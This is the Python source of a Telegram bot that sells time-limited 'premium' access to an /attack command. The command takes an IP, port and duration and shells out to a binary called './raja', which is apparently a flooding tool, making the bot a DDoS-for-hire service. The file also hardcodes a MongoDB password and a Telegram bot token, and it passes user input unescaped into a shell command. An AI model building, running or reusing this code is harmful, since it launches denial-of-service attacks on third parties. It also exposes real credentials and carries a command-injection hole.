import asyncio
import random
import string
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database configuration
MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
client = MongoClient(MONGO_URI)
db = client['rbbl']
users_collection = db['VAMPIREXCHEATS']
redeem_codes_collection = db['redeem_codes0']

# Bot configuration
TELEGRAM_BOT_TOKEN = '7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE'
ADMIN_USER_ID = 7017469802 

# Global variables
cooldown_dict = {}
user_attack_history = {}
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "🌟 *Available Commands:* \n\n"
            "🔹 /start - Start interacting with the bot\n"
            "🔹 /attack - Launch a network operation\n"
            "🔹 /redeem - Activate a premium code\n"
            "🔹 /get_id - Display your user ID\n"
        )
    else:
        help_text = (
            "👑 *Admin Commands:*\n\n"
            "🔹 /start - Initialize the bot\n"
            "🔹 /attack - Execute network operation\n"
            "🔹 /get_id - Show user ID\n"
            "🔹 /remove [user_id] - Revoke user access\n"
            "🔹 /users - List all authorized users\n"
            "🔹 /gen - Create a premium code\n"
            "🔹 /redeem - Activate a premium code\n"
        )
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=help_text, 
        parse_mode='Markdown'
    )
    
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  
    user_name = update.effective_user.first_name  
    
    if not await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="⚠️ *Access Denied*", 
            parse_mode='Markdown'
        )
        return
        
    welcome_message = (
        "🚀 *Welcome to Network Operations Center* \n\n"
        "To initiate an operation, use:\n"
        "🔹 /attack <ip> <port> <duration>\n\n"
        "For assistance, contact @LDX_COBRA"
    )
    await context.bot.send_message(
        chat_id=chat_id, 
        text=welcome_message, 
        parse_mode='Markdown'
    )

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="⛔ *Permission Denied*", 
            parse_mode='Markdown'
        )
        return
        
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="ℹ️ *Usage: /remove <user_id>*", 
            parse_mode='Markdown'
        )
        return
        
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=f"✅ *User {target_user_id} removed*", 
        parse_mode='Markdown'
    )

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Authorization check
    if not await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="🔒 *Premium Access Required*", 
            parse_mode='Markdown'
        )
        return
    
    # Validate arguments
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="ℹ️ *Usage: /attack <ip> <port> <duration>*", 
            parse_mode='Markdown'
        )
        return
    
    ip, port, duration = args
    
    # IP validation
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="❌ *Invalid Target*", 
            parse_mode='Markdown'
        )
        return
    
    # Duration validation
    try:
        duration = int(duration)
        if duration > 200:
            await context.bot.send_message(
                chat_id=chat_id, 
                text="⚠️ *Maximum duration is 200 seconds*", 
                parse_mode='Markdown'
            ) 
            return
    except ValueError:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="❌ *Invalid Duration*", 
            parse_mode='Markdown'
        )
        return
    
    # Cooldown check
    cooldown_period = 120
    current_time = datetime.now()
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏳ *Please wait {remaining_time} seconds before next operation*",
                parse_mode='Markdown'
            )
            return
    
    # Target check
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="⚠️ *This target was recently processed*", 
            parse_mode='Markdown'
        )
        return
    
    # Update cooldown and history
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))
    
    # Send confirmation
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "🚀 *Operation Initiated* \n\n"
            f"🔹 *Target:* {ip}:{port}\n"
            f"🔹 *Duration:* {duration} seconds\n\n"
            "Processing your request..."
        ), 
        parse_mode='Markdown'
    )

    # Execute operation
    asyncio.create_task(execute_operation(chat_id, ip, port, duration, context))
    
async def show_user_id(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
    message = f"🔑 *Your User ID:* `{user_id}`" 
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

async def execute_operation(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./raja {ip} {port} {duration} 800",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            logger.info(f"[stdout]\n{stdout.decode()}")
        if stderr:
            logger.error(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"⚠️ *Error during operation: {str(e)}*", 
            parse_mode='Markdown'
        )
    finally:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="✅ *Operation Completed*\n\nReport any issues to @LDX_COBRA", 
            parse_mode='Markdown'
        )

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="⛔ *Admin Privileges Required*", 
            parse_mode='Markdown'
        )
        return
        
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="ℹ️ *Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return
        
    max_uses = 1
    custom_code = None
    time_input = context.args[0]
    
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
        
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="⚠️ *Please specify time in days (d) or minutes (m)*", 
            parse_mode='Markdown'
        )
        return
        
    if time_input[-1].lower() == 'd':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day"
    elif time_input[-1].lower() == 'm':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute"
        
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="⚠️ *Invalid maximum uses value*", 
                parse_mode='Markdown'
            )
            return
            
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [], 
        "max_uses": max_uses,
        "redeem_count": 0
    })
    
    message = (
        f"🎟️ *Premium Code Generated*\n\n"
        f"🔹 *Code:* `{redeem_code}`\n"
        f"🔹 *Validity:* {expiry_label}\n"
        f"🔹 *Max Uses:* {max_uses}"
    )
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="ℹ️ *Usage: /redeem <code>*", 
            parse_mode='Markdown'
        )
        return
        
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    
    if not redeem_entry:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="❌ *Invalid Code*", 
            parse_mode='Markdown'
        )
        return
        
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
        
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="❌ *Code Expired*", 
            parse_mode='Markdown'
        )
        return
        
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="❌ *Maximum Uses Reached*", 
            parse_mode='Markdown'
        )
        return
        
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="⚠️ *Already Redeemed*", 
            parse_mode='Markdown'
        )
        return
        
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    
    await context.bot.send_message(
        chat_id=chat_id, 
        text="🎉 *Premium Activated Successfully!*", 
        parse_mode='Markdown'
    )

async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()    
    user_list_message = "👥 *User List*\n\n" 
    
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
            
        time_remaining = expiry_date - current_time
        
        if time_remaining.days < 0:
            remaining_days = 0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False      
            
        expiry_label = f"{remaining_days}D {remaining_hours}H {remaining_minutes}M"
        
        if expired:
            user_list_message += f"🔴 *{user_id}* - Expired\n"
        else:
            user_list_message += f"🟢 *{user_id}* - {expiry_label}\n"
            
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=user_list_message, 
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("get_id", show_user_id))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("help", help_command))
    
    # Start polling
    application.run_polling()
    logger.info("Bot service initialized")

if __name__ == '__main__':
    main()
